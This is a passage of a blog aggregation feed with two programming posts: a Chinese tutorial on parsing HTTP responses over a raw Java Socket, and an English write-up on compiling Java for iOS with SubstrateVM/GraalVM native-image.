<span class="class"><span class="keyword">interface</span> <span class="title">HttpConst</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 回车和换行</span></span><br><span class="line">    <span class="keyword">int</span> CR = <span class="number">13</span>;</span><br><span class="line">    <span class="keyword">int</span> LF = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    String CRLF = <span class="string">"\r\n"</span>;</span><br><span class="line">    String GET = <span class="string">"GET "</span>;</span><br><span class="line">    String HOST = <span class="string">"Host: "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Http-报文解析类"><a href="#Http-报文解析类" class="headerlink" title="Http 报文解析类"></a>Http 报文解析类</h2><p>是整个 Socket 网络编程的核心。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpCodec</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ByteBuffer byteBuffer;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HttpCodec</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        byteBuffer = ByteBuffer.allocate(<span class="number">10</span> * <span class="number">1024</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解析响应行</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">readLine</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span> b;</span><br><span class="line">            <span class="keyword">boolean</span> EndOfLine = <span class="keyword">false</span>;</span><br><span class="line">            <span class="comment">// 标记</span></span><br><span class="line">            byteBuffer.clear();</span><br><span class="line">            byteBuffer.mark();</span><br><span class="line">            <span class="keyword">while</span> ((b = (<span class="keyword">byte</span>) inputStream.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteBuffer.put(b);</span><br><span class="line">                <span class="comment">// 读取到 /r 则记录，判断下一个字节是否为 /n</span></span><br><span class="line">                <span class="keyword">if</span> (b == HttpConst.CR) &#123;</span><br><span class="line">                    EndOfLine = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (EndOfLine) &#123;</span><br><span class="line">                    <span class="comment">// 上一个字节是 /r，并且本次读取到 /n</span></span><br><span class="line">                    <span class="keyword">if</span> (b == HttpConst.LF) &#123;</span><br><span class="line">                        <span class="comment">// 获得目前读取的所有字节</span></span><br><span class="line">                        <span class="keyword">byte</span>[] lineBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[byteBuffer.position()];</span><br><span class="line">                        <span class="comment">// 返回标记位置</span></span><br><span class="line">                        byteBuffer.reset();</span><br><span class="line">                        byteBuffer.get(lineBytes);</span><br><span class="line">                        <span class="comment">// 清空 buffer 重新标记</span></span><br><span class="line">                        byteBuffer.clear();</span><br><span class="line">                        byteBuffer.mark();</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> String(lineBytes);</span><br><span class="line">                    &#125;</span><br><span class="line">                    EndOfLine = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Response Read Line."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解析响应头</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, String&gt; <span class="title">readHeaders</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        HashMap&lt;String, String&gt; headers = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            String line = readLine(inputStream);</span><br><span class="line">            <span class="comment">// 读取到空行，则下一行开始为响应体</span></span><br><span class="line">            <span class="keyword">if</span> (line == <span class="keyword">null</span> || line.equals(<span class="string">"\r\n"</span>)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> index = line.indexOf(<span class="string">":"</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                String name = line.substring(<span class="number">0</span>, index);</span><br><span class="line">                <span class="comment">// ":" 移动两位，总长度减去 "\r\n"</span></span><br><span class="line">                String value = line.substring(index + <span class="number">2</span>, line.length() - <span class="number">2</span>);</span><br><span class="line">                headers.put(name, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> headers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解析响应体</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] readBytes(InputStream inputStream, <span class="keyword">int</span> length) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">        <span class="keyword">int</span> readNum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            readNum += inputStream.read(bytes, readNum, length - readNum);</span><br><span class="line">            <span class="comment">// 读取完毕</span></span><br><span class="line">            <span class="keyword">if</span> (readNum == length) &#123;</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解析分块编码形式的响应体</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">readChunked</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">boolean</span> isEmptyData = <span class="keyword">false</span>;</span><br><span class="line">        StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                String line = readLine(inputStream);</span><br><span class="line">                <span class="comment">// 减掉 "\r\n"</span></span><br><span class="line">                line = line.substring(<span class="number">0</span>, line.length() - <span class="number">2</span>);</span><br><span class="line">                <span class="comment">// Chunked 编码最后一段数据为 0 \r\n\r\n</span></span><br><span class="line">                len = Integer.valueOf(line, <span class="number">16</span>);</span><br><span class="line">                isEmptyData = len == <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 块的长度不包括 "\r\n"，所以加 2，将 "\r\n" 读走</span></span><br><span class="line">                <span class="keyword">byte</span>[] bytes = readBytes(inputStream, len + <span class="number">2</span>);</span><br><span class="line">                buffer.append(<span class="keyword">new</span> String(bytes));</span><br><span class="line">                len = -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (isEmptyData) &#123;</span><br><span class="line">                    <span class="keyword">return</span> buffer.toString();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><ul><li><p>Java 原生 Socket 中 InputStream 的获取，为字节流：InputStream inputStream = socket.getInputStream(); </p></li><li><p>在解析响应行 readLine() 中，需要设置 EndOfLine 标志，用来判断是响应行的最后字节 “\r\n”。</p></li><li><p>HTTP 响应体有分块编码的方式，表现为头部字段 Transfer-Encoding: chunked，有此字段则数据通过分块传输。区别于 Content-Length 显示数据的长度，分块编码可以不预先知道发送内容的总大小。</p></li></ul><h2 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h2><p>请求高德地图的天气 API。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SocketTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">httpTest</span><span class="params">()</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> HttpUrl url = <span class="keyword">new</span> HttpUrl(<span class="string">"http://restapi.amap.com/v3/weather/weatherInfo?city=南京&amp;key= "</span>);</span><br><span class="line">        System.out.println(<span class="string">"protocol："</span> + url.getProtocol());</span><br><span class="line">        System.out.println(<span class="string">"host："</span> + url.getHost());</span><br><span class="line">        System.out.println(<span class="string">"port："</span> + url.getPort());</span><br><span class="line">        System.out.println(<span class="string">"path："</span> + url.getPath());</span><br><span class="line">        <span class="comment">// 使用 StringBuffer</span></span><br><span class="line">        StringBuffer buffer = createRequestPacket(url);</span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Socket 建立连接，InetSocketAddress 包含 host + port</span></span><br><span class="line">            socket.connect(<span class="keyword">new</span> InetSocketAddress(url.getHost(), url.getPort()), <span class="number">5000</span>);</span><br><span class="line">            <span class="comment">// 获取输入输出流</span></span><br><span class="line">            <span class="keyword">final</span> OutputStream outputStream = socket.getOutputStream();</span><br><span class="line">            <span class="keyword">final</span> InputStream inputStream = socket.getInputStream();</span><br><span class="line">            <span class="comment">// 输出的后三行分别为请求行、请求头、空行、请求体</span></span><br><span class="line">            System.out.println(<span class="string">"开始发送报文... \n"</span> + buffer);</span><br><span class="line">            sendRequest(buffer, outputStream);</span><br><span class="line">            <span class="comment">// 使用 lambda 表达式</span></span><br><span class="line">            <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">                HttpCodec httpCodec = <span class="keyword">new</span> HttpCodec();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 解析响应行</span></span><br><span class="line">                    String responseLine = httpCodec.readLine(inputStream);</span><br><span class="line">                    System.out.println(<span class="string">"响应行："</span> + responseLine);</span><br><span class="line">                    System.out.println(<span class="string">"响应头："</span>);</span><br><span class="line">                    <span class="comment">// 解析响应头</span></span><br><span class="line">                    Map&lt;String, String&gt; headers = httpCodec.readHeaders(inputStream);</span><br><span class="line">                    <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : headers.entrySet()) &#123;</span><br><span class="line">                        System.out.println(entry.getKey() + <span class="string">":"</span> + entry.getValue());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 解析 Content-Length 响应体</span></span><br><span class="line">                    <span class="keyword">if</span> (headers.containsKey(<span class="string">"Content-Length"</span>)) &#123;</span><br><span class="line">                        <span class="keyword">int</span> length = Integer.valueOf(headers.get(<span class="string">"Content-Length"</span>));</span><br><span class="line">                        <span class="keyword">byte</span>[] bytes = httpCodec.readBytes(inputStream, length);</span><br><span class="line">                        System.out.println(<span class="string">"\n响应体："</span> + <span class="keyword">new</span> String(bytes));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 分块编码</span></span><br><span class="line">                        String response = httpCodec.readChunked(inputStream);</span><br><span class="line">                        System.out.println(<span class="string">"\n分块响应体："</span> + response);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span> * <span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建 Http 请求</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> StringBuffer <span class="title">createRequestPacket</span><span class="params">(HttpUrl url)</span> </span>&#123;</span><br><span class="line">        StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="comment">// 请求行</span></span><br><span class="line">        buffer.append(HttpConst.GET);</span><br><span class="line">        buffer.append(url.getPath());</span><br><span class="line">        buffer.append(<span class="string">" "</span>);</span><br><span class="line">        buffer.append(<span class="string">"HTTP/1.1"</span>);</span><br><span class="line">        buffer.append(HttpConst.CRLF);</span><br><span class="line">        <span class="comment">// 请求头</span></span><br><span class="line">        buffer.append(HttpConst.HOST);</span><br><span class="line">        buffer.append(url.getHost());</span><br><span class="line">        buffer.append(HttpConst.CRLF);</span><br><span class="line">        <span class="comment">// 请求体，可以为空</span></span><br><span class="line">        buffer.append(HttpConst.CRLF);</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送 Http 请求</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequest</span><span class="params">(StringBuffer buffer, OutputStream outputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        outputStream.write(buffer.toString().getBytes());</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在发送 Http 请求 sendRequest() 中，write() 先把数据写到内存缓冲区（字符转换为字节），flush() 再把内存缓冲区的数据刷新到文件中。</p><h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><img src="/images/blog12/test.png" width="80%"/><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>用 Socket 进行网络通信，本质上是 I/O 操作，将响应报文解析成内存中的对象，我认为是核心。</p><p>后续我将继续研究 Spring Boot 框架内是如何处理 HTTP 请求，并转发到对应 Controller 上的。</p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="https://blog.csdn.net/CrazyMo_/article/details/88642354" target="_blank" rel="noopener">https://blog.csdn.net/CrazyMo_/article/details/88642354</a></p>]]></content>
        <author>
            <name><![CDATA[风的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/substratevm-on-ios.html</id>
        <title><![CDATA[SubstrateVM on iOS]]></title>
        <updated>2021-03-09T00:27:10+08:00</updated>
        <link href="https://www.noisyfox.io/substratevm-on-ios.html"/>
        <content type="text/html" src="https://www.noisyfox.io/substratevm-on-ios.html"><![CDATA[<p>This article records my attempts &amp; findings when using SubstrateVM to run JVM compatible languages on iOS. The goal is to replace the outdated Android Runtime (ART) currently used by MOE with SubstrateVM. Currently it&#8217;s still in a very early stage and this article is not meant to be a complete guide on running Java app on iOS, but to share my progress and give anyone who&#8217;s interested in this something to start with.</p>



<p>I will keep updating this article once I made any more progress, you could join the discussion by leaving comments down below, or join the Multi-OS Engine Community discord channel: <a href="https://discord.gg/m5t3qNXTWj" target="_blank" rel="noreferrer noopener">https://discord.gg/m5t3qNXTWj</a></p>



<hr class="wp-block-separator"/>



<h2>Motivation</h2>



<p>Current version of MOE is based on the ART from Android 6 and support Java 7 features only. With retrolambda we get limited support of Java 8 features like Lambda and default methods. However the lack of a true Java 8 support makes it harder and harder to use as nowadays more and more 3rd libraries moved to Java 8 (and even higher).</p>



<p>It is possible that we update the ART to a later version (such as from Android 7+), however this requires a huge amount of effort because:</p>



<ul><li>The Android code is not well documented</li><li>The code structure changes significantly between each Android major releases</li><li>ART has its own native code generator, instead of LLVM, so no bitcode support</li><li>ART is not designed to be run on any OS other than Android, and requires a lot of modifications to be able to run on iOS because Apple does things differently than Google</li><li>ART is not fully compatible with any &#8220;official&#8221; JDK release (Google likes to mix features from different JDK versions)</li></ul>



<p>On the contrary, SubstrateVM is:</p>



<ul><li>Created &amp; supported by Oracle</li><li>Support iOS (and may other platforms) by design</li><li>Based on official OpenJDK</li><li>Currently support Java 8 and Java 11</li><li>Better stacktrace</li></ul>



<p>This gives a clear advantage to SubstrateVM over ART as a much more reliable and futureproof solution.</p>



<p>SubstrateVM does come with some downsides, namely:</p>



<ul><li>Not production-ready yet</li><li>Binary size is larger reportedly</li><li>Slower and more memory consumption during compiling</li></ul>



<p>But those issues should be resolved eventually so I&#8217;m not that worried about at the moment.</p>



<hr class="wp-block-separator"/>



<h2>Problem to be Solved</h2>



<p>Here are some problems that need to be figured out before we could confidently use this in MOE:</p>



<ul><li>How to compile Java code into a static shared library / iOS framework / Mach-O file so it can be linked to a normal iOS app (partly solved, see below)</li><li>Figure out the difference to the (modified) ART used in MOE currently, and how this could cause issues when trying porting existing MOE project to this new VM</li><li>How to debug the application once it has been compiled to native binary</li><li>How bitcode could be supported</li></ul>



<hr class="wp-block-separator"/>



<h2>Acknowledgments</h2>



<p>The work I&#8217;ve done so far largely based on the awesome work from the Gluon Substrate project: <a href="https://github.com/gluonhq/substrate" target="_blank" rel="noreferrer noopener">https://github.com/gluonhq/substrate</a>.</p>



<p>Gluon is a framework that allows you to right JavaFX application that can be run on multiple platforms, including iOS (which is based on SubstrateVM). I highly recommend to check out their awesome project!</p>



<p>In the following parts I might include some code fragments from this project and might also uses certain files directly from Gluon&#8217;s website for demonstration purpose.</p>



<p>However, this article and any work I did/will do in the future are not directly related to Gluon or any of their product.</p>



<hr class="wp-block-separator"/>



<h2>Preparation</h2>



<p>Most of the work I&#8217;ve done are under MacOS, so all the tools I mention later are all MacOS versions. I&#8217;ll assume most of you have access to a Mac and are familiar with some basic dev tools &amp; processes on Mac, so I won&#8217;t explain everything in this article. Again, this is not a complete guide.</p>



<p>Download the official prebuilt GraalVM from <a href="https://github.com/graalvm/graalvm-ce-builds/releases/tag/vm-21.0.0.2" target="_blank" rel="noreferrer noopener">https://github.com/graalvm/graalvm-ce-builds/releases/tag/vm-21.0.0.2</a>. This is the version I&#8217;m using while writing this part. Download the <a href="https://github.com/graalvm/graalvm-ce-builds/releases/download/vm-21.0.0.2/graalvm-ce-java11-darwin-amd64-21.0.0.2.tar.gz">graalvm-ce-java11-darwin-amd64-21.0.0.2.tar.gz</a> and extract it somewhere.</p>



<p>This is a complete JDK distribution, so I simply added it to the <strong>jenv</strong> for easier version switching. Once the GraalVM is activated as current JDK, run the following command to install the SubstrateVM (i.e. native-image):</p>



<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">gu install --jvm native-image
gu install --jvm llvm-toolchain</pre>



<hr class="wp-block-separator"/>



<h2>Hello World</h2>



<p>I created a very simple hello world in Java:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="Test.java" data-enlighter-group="test-java">public class Test {
    public static void main(String[] args) {
        System.out.println("hello world!");
    }
}</pre>



<p>Then compile it to class file:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">javac Test.java</pre>



<hr class="wp-block-separator"/>



<h2>Java Bytecode to Binary</h2>



<p>The document of SubstrateVM states by using the <code data-enlighter-language="shell" class="EnlighterJSRAW">native-image</code> command, one can compile the java bytecode (the .class file) into either an <a href="https://www.graalvm.org/reference-manual/native-image/#build-a-native-image" target="_blank" rel="noreferrer noopener">executable</a> (the default option) or a <a href="https://www.graalvm.org/reference-manual/native-image/#build-a-shared-library" target="_blank" rel="noreferrer noopener">shared (dynamic) library</a>. However none of these options fits our needs because:</p>



<ul><li>We need to link the generated binary into a normal iOS application, so it has to be a library, not a standalone executable</li><li>iOS does not allow loading our own dynamic library at runtime, so the library needs to be statically linked to our app</li></ul>



<p>Before I even worry about this problem, as a proof of concept, I first tried to compile it into a x86_64 Darwin executable and ran it using <code data-enlighter-language="shell" class="EnlighterJSRAW">native-image Test</code>:</p>



<div class="wp-block-image is-style-default"><figure class="aligncenter size-large"><a href="https://www.noisyfox.io/wp-content/uploads/2021/03/image.png" target="_blank" rel="noopener"><img loading="lazy" width="516" height="354" src="https://www.noisyfox.io/wp-content/uploads/2021/03/image.png" alt="SubstrateVM on iOS - compile with default settings" class="wp-image-812" srcset="https://www.noisyfox.io/wp-content/uploads/2021/03/image.png 516w, https://www.noisyfox.io/wp-content/uploads/2021/03/image-300x206.png 300w" sizes="(max-width: 516px) 100vw, 516px" /></a><figcaption>Compile with default settings</figcaption></figure></div>



<p>Ok that wasn&#8217;t too hard. Now let&#8217;s try using the LLVM backend by adding <code data-enlighter-language="shell" class="EnlighterJSRAW">-H:CompilerBackend=llvm</code> option to the command:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><a href="https://www.noisyfox.io/wp-content/uploads/2021/03/image-1.png" target="_blank" rel="noopener"><img loading="lazy" width="828" height="709" src="https://www.noisyfox.io/wp-content/uploads/2021/03/image-1.png" alt="SubstrateVM on iOS - llvm compile failed" class="wp-image-814" srcset="https://www.noisyfox.io/wp-content/uploads/2021/03/image-1.png 828w, https://www.noisyfox.io/wp-content/uploads/2021/03/image-1-300x257.png 300w, https://www.noisyfox.io/wp-content/uploads/2021/03/image-1-768x658.png 768w" sizes="(max-width: 828px) 100vw, 828px" /></a><figcaption>LLVM compile failed with no extra options</figcaption></figure></div>



<p>Oops! A quick search of <code data-enlighter-language="raw" class="EnlighterJSRAW">ImageSingletons do not contain key org.graalvm.home.HomeFinder</code> lead me to <a href="https://github.com/oracle/graal/issues/1889#issuecomment-559136202" target="_blank" rel="noreferrer noopener">this github issue</a>, which tells me to add <code data-enlighter-language="shell" class="EnlighterJSRAW">--features=org.graalvm.home.HomeFinderFeature</code> to the command:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><a href="https://www.noisyfox.io/wp-content/uploads/2021/03/image-2.png" target="_blank" rel="noopener"><img loading="lazy" width="613" height="410" src="https://www.noisyfox.io/wp-content/uploads/2021/03/image-2.png" alt="SubstrateVM on iOS - LLVM compiled with HomeFinderFeature enabled" class="wp-image-820" srcset="https://www.noisyfox.io/wp-content/uploads/2021/03/image-2.png 613w, https://www.noisyfox.io/wp-content/uploads/2021/03/image-2-300x201.png 300w" sizes="(max-width: 613px) 100vw, 613px" /></a><figcaption>LLVM compiled with HomeFinderFeature enabled</figcaption></figure></div>



<p>Ok. Now let&#8217;s try compile it into a library by adding <code data-enlighter-language="shell" class="EnlighterJSRAW">--shared</code> at the end:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><a href="https://www.noisyfox.io/wp-content/uploads/2021/03/image-3.png" target="_blank" rel="noopener"><img loading="lazy" width="618" height="771" src="https://www.noisyfox.io/wp-content/uploads/2021/03/image-3.png" alt="SubstrateVM on iOS - compile into shared library" class="wp-image-825" srcset="https://www.noisyfox.io/wp-content/uploads/2021/03/image-3.png 618w, https://www.noisyfox.io/wp-content/uploads/2021/03/image-3-240x300.png 240w" sizes="(max-width: 618px) 100vw, 618px" /></a><figcaption>Compile into shared library</figcaption></figure></div>



<p>As you can see, a dynamic library has been generated (&#8220;test.dylib&#8221;), with few C header files. By looking at the content of the &#8220;test.h&#8221;, I found a function <code data-enlighter-language="c" class="EnlighterJSRAW">int run_main(int argc, char** argv);</code> which is pretty clear to me that I need to call this function in my iOS app to execute the Java main function, similar to the <code data-enlighter-language="c" class="EnlighterJSRAW">moevm(argc, argv);</code> we called from <a href="https://github.com/multi-os-engine-community/moe-samples-java/blob/69f97cb7743c0d19debfb7f85d64ab7984c892e5/Calculator/ios/xcode/ios/main.cpp#L4" target="_blank" rel="noreferrer noopener">the main function in MOE</a>.</p>



<p>Then what&#8217;s next is pretty clear: I need to somehow make that dynamic library into a static library so we could link it in iOS project.</p>



<hr class="wp-block-separator"/>



<h2>Or Maybe an Object File Instead&#8230;?</h2>



<p>TBC</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/substratevm-on-ios.html">SubstrateVM on iOS</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
        <author>
            <name><![CDATA[狐狸的小小窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/ocaml-heap/</id>
